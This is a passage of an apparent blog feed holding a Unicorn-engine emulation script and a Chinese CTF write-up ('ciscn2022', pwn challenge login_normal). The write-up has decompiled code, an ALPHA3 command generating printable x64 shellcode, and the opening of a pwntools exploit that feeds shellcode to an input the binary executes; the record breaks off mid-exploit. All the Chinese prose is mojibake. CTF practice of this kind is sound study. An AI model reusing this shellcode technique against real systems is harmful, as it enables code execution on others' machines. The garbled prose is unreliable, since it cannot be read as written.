class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u32</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;I&quot;</span>,data)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p32</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;I&quot;</span>,num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_64)</span><br><span class="line"></span><br><span class="line">prog_base = <span class="number">0x400000</span></span><br><span class="line">stack_base = <span class="number">0x0</span></span><br><span class="line">stack_size = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line"></span><br><span class="line">mu.mem_map(prog_base, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(stack_base, stack_size)</span><br><span class="line"></span><br><span class="line">mu.mem_write(prog_base, read_file(<span class="string">&quot;./fibonacci&quot;</span>))</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, stack_base+stack_size-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x4004E0</span></span><br><span class="line">end = <span class="number">0x400575</span></span><br><span class="line"></span><br><span class="line">instructions_skip_list = [<span class="number">0x4004EF</span>,<span class="number">0x4004F6</span>,<span class="number">0x400502</span>,<span class="number">0x40054F</span>]</span><br><span class="line"></span><br><span class="line">Fib_entry = <span class="number">0x400670</span></span><br><span class="line">Fib_return = [<span class="number">0x4006F1</span>, <span class="number">0x400709</span>]</span><br><span class="line"></span><br><span class="line">stack = []</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="comment">#print(&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27; %(address, size))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> instructions_skip_list:</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == <span class="number">0x400560</span>:</span><br><span class="line">        c = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == Fib_entry:</span><br><span class="line">        arg0 = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        r_rsi = mu.reg_read(UC_X86_REG_RSI)</span><br><span class="line">        arg1 = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (arg0,arg1) <span class="keyword">in</span> d:</span><br><span class="line">            (ret_rax, ret_ref) = d[(arg0,arg1)]</span><br><span class="line">            mu.reg_write(UC_X86_REG_RAX, ret_rax)</span><br><span class="line">            mu.mem_write(r_rsi, p32(ret_ref))</span><br><span class="line">            mu.reg_write(UC_X86_REG_RIP,<span class="number">0x400582</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stack.append((arg0,arg1,r_rsi))</span><br><span class="line">    <span class="keyword">elif</span> address <span class="keyword">in</span> Fib_return:</span><br><span class="line">        (arg0, arg1, r_rsi) = stack.pop()</span><br><span class="line">        ret_rax = mu.reg_read(UC_X86_REG_RAX)</span><br><span class="line">        ret_ref = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line">        d[(arg0, arg1)] = (ret_rax, ret_ref)</span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">mu.emu_start(start, end)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç»“åˆ ctfèµ›é¢˜ å­¦ä¹ ä¸€ä¸‹ unicorn å¼•æ“çš„åŸºç¡€ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://bbs.pediy.com/thread-224330.htm#msg_header_h3_1&quot;&gt;å‚è€ƒæ–‡ç« &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/kabeor/Unicorn-Engine-Documentation/blob/master/Unicorn-Engine%20Documentation.md&quot;&gt;unicornä¸­æ–‡æ–‡æ¡£&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="other" scheme="http://example.com/categories/other/"/>
    
    
  </entry>
  
  <entry>
    <title>ciscn2022</title>
    <link href="http://example.com/2022/05/30/ciscn2022/"/>
    <id>http://example.com/2022/05/30/ciscn2022/</id>
    <published>2022-05-30T03:41:37.000Z</published>
    <updated>2023-01-18T08:54:33.015Z</updated>
    
    <content type="html"><![CDATA[<p>è€ƒç ”é€‰æ‰‹æ¥æ‘¸é±¼ã€‚</p><p>ä»Šå¹´å›½èµ›èœå¾—å¾ˆå¿«ä¹ï¼Œè¶Ÿå¾—ä¹Ÿå¾ˆå¿«ä¹~</p><span id="more"></span><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>åæ§½ï¼šç›¸æ¯”äºå»å¹´å•¥éƒ½ä¸ä¼š(å½“æ—¶è¿å †éƒ½æ²¡æ¥è§¦è¿‡)ï¼Œä»Šå¹´ç»ˆäºåšå‡ºé¢˜äº†ï¼Œè™½ç„¶ä¸æ˜¯å †é¢˜ã€‚å †çš„ libc æ›´æ–°å¤ªå¿«äº†ï¼Œæˆ‘è¿ 2.27 éƒ½æ²¡ææ˜ç™½ï¼Œ2.33ã€2.34çš„å°±æ¥äº†ï¼ˆè€äººç–‘æƒ‘</p><h3 id="login-normal"><a href="#login-normal" class="headerlink" title="login_normal"></a>login_normal</h3><p>ä¿æŠ¤å…¨å¼€ã€‚è¿™é“é¢˜åˆ†æå¥½ä»£ç å°±ä¼šå†™äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+0h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x3FF</span>uLL);</span><br><span class="line">    menu(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯<code>main</code>å‡½æ•°ï¼Œå°±æ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œè¯»å…¥è¾“å…¥ï¼Œçœ‹ä¸å‡ºå•¥åå ‚ï¼Œè¿›å…¥<code>menu</code>çœ‹çœ‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">menu</span><span class="params">(_BYTE *our_input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *sa; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sb; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sc; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sd; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+17h] [rbp-39h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *nptr; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(qword_202040, <span class="number">0</span>, <span class="keyword">sizeof</span>(qword_202040));</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  dest = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !*our_input || *our_input != <span class="number">0xA</span> &amp;&amp; (*our_input != <span class="number">13</span> || our_input[<span class="number">1</span>] != <span class="number">10</span>) )  <span class="comment">//é‡&#x27;\n&#x27;è·³å‡º</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )                              <span class="comment">// 6æ¬¡æœºä¼šread</span></span><br><span class="line">      qword_202040[<span class="number">2</span> * v8] = our_input;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(our_input, <span class="string">&#x27;:&#x27;</span>);                <span class="comment">// å¯»æ‰¾&#x27;:&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> ( !sb )                                  <span class="comment">// æ‰¾ä¸åˆ°å°±æŠ¥é”™</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="comment">//**è¿™é‡Œè¯´æ˜æˆ‘ä»¬çš„è¾“å…¥å¿…é¡»è¦åŒ…å«ä¸€ä¸ª&#x27;:&#x27;</span></span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )</span><br><span class="line">      *sc = <span class="number">0</span>;                                  <span class="comment">// ä»&#x27;:&#x27;åä¸€ä½å¯»æ‰¾å†…å®¹</span></span><br><span class="line">    <span class="keyword">if</span> ( !*sc )                                 <span class="comment">// è‹¥è¾“å…¥å†…å®¹åŒ…å«ç‰¹æ®Šå­—ç¬¦å°±æŠ¥é”™</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;<span class="comment">//**è¿™é‡Œè¯´æ˜&#x27;:&#x27;åä¸€ä½ä¸å‡†è·Ÿç‰¹æ®Šå­—ç¬¦</span></span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="number">10</span>);<span class="comment">// å¯»æ‰¾&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> ( !sd )   <span class="comment">// æ‰¾ä¸åˆ°å°±æŠ¥é”™</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;<span class="comment">//**è¿™é‡Œè¯´æ˜å†…å®¹åé¢å¿…é¡»æœ‰&#x27;\n&#x27;</span></span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line">    our_input = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *our_input == <span class="number">13</span> )</span><br><span class="line">      *our_input++ = <span class="number">0</span>;</span><br><span class="line">    s1 = qword_202040[<span class="number">2</span> * v8];                  <span class="comment">// s1ä¸º&#x27;:&#x27;å‰çš„å­—ç¬¦ä¸²</span></span><br><span class="line">    nptr = qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];            <span class="comment">// npträ¸º&#x27;:&#x27;åçš„å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(s1, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = atoi(nptr);<span class="comment">// è‹¥åœ¨æˆ‘ä»¬çš„è¾“å…¥ä¸­æ‰¾åˆ°äº†&#x27;opt&#x27;å­—ç¬¦ä¸²ï¼Œå°†å…¶è½¬ä¸ºintæ•´å‹å‚¨å­˜åœ¨v7</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( strcasecmp(s1, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, nptr, v9);<span class="comment">// è‹¥åœ¨è¾“å…¥ä¸­æ‰¾åˆ°äº†&#x27;msg&#x27;ï¼Œåˆ™å°†&#x27;:&#x27;åè¾¹çš„å†…å®¹å¤åˆ¶åˆ°desté‡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;<span class="comment">// è®¡æ•°å™¨+1ï¼Œé‡å¤ä»¥ä¸Šæ­¥éª¤</span></span><br><span class="line">  &#125;</span><br><span class="line">  *our_input = <span class="number">0</span>;</span><br><span class="line">  sa = our_input + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *sa == <span class="number">10</span> )</span><br><span class="line">    *sa = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v7 )<span class="comment">// å¯¹åº”ä»¥ä¸Šå¾ªç¯é‡Œçš„&#x27;opt&#x27;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      backdoor(dest);<span class="comment">// å¯¹åº”ä»¥ä¸Šå¾ªç¯é‡Œçš„&#x27;msg&#x27;</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      sub_EFE(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      root(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å†æ¥çœ‹çœ‹<code>root</code>å‡½æ•°é‡Œæœ‰ä»€ä¹ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_CBD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;ro0t&quot;</span>) )<span class="comment">// a1å³åœ¨menuä¸­ä¼ å…¥çš„dest</span></span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;<span class="comment">// å°†ä¸¤ä¸ªå…¨å±€å˜é‡ç½®ä¸º1ï¼Œåœ¨backdoorå‡½æ•°é‡Œæœ‰ç”¨</span></span><br><span class="line">    unk_202024 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ¥çœ‹ä¸‹<code>backdoor</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_DA8</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )<span class="comment">// æ£€æµ‹menuä¸­ä¼ å…¥çš„destå†…å®¹æ˜¯å¦å¯æ‰“å°</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);<span class="comment">// ä¸å¯æ‰“å°å°±æŠ¥é”™</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202028 != <span class="number">1</span> )<span class="comment">//æ£€æµ‹æ˜¯å¦root</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202024 )<span class="comment">//æ£€æµ‹æ˜¯å¦root</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getpagesize();<span class="comment">// è·å–ä¸€é¡µçš„å¤§å°</span></span><br><span class="line">    dest = mmap(&amp;loc_FFE + <span class="number">2</span>, v1, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);<span class="comment">// ç”³è¯·ä¸€ç‰‡å¯è¯»å¯å†™å¯æ‰§è¡Œçš„ç©ºé—´</span></span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, v2);<span class="comment">//å°†destå†…å®¹å¤åˆ¶è‡³è¯¥ç©ºé—´</span></span><br><span class="line">    (dest)();<span class="comment">//ç›´æ¥æ‰§è¡Œdestå†…å®¹</span></span><br><span class="line"><span class="comment">// text:0000000000000EC9                 call    rdx //</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br></pre></td></tr></table></figure><p>æ€»çš„æ¥è¯´ï¼Œæ˜¯ä¸€é“ç¼–å†™å¯è§å­—ç¬¦ä¸²çš„<code>shellcode</code>é¢˜å‹ï¼Œæˆ‘ä»¬åˆ©ç”¨<code>alpha3</code>å·¥å…·ä¾¿å¯ç”ŸæˆåŸºäº<code>rdx</code>çš„å¯æ‰“å°<code>shellcode</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/buupwn/mrctf/alpha3$ python ./ALPHA3.py x64 ascii mixedcase rdx --input=<span class="string">&quot;shellcode&quot;</span></span><br><span class="line">Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00</span><br></pre></td></tr></table></figure><p>æœ‰å¦‚ä¸‹ expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line"><span class="comment">#io=remote(&quot;39.105.43.168&quot;,13321)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *$rebase(0x01346)&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;opt:1\nmsg:ro0tt\n\n:1&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span 